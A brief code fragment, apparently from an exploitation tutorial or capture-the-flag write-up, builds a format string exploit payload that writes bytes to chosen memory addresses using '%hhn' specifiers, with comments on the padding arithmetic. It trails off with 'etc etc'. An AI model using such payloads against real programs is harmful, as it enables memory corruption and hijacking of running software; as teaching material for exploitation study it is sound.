```
payload = p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)
payload += "%104x%4$hhn"         # 0x78 - 16 = 104
payload += "%222x%5$hhn"          # 0x56 - 0x78 + 0x100 (the overflow)
etc etc
```
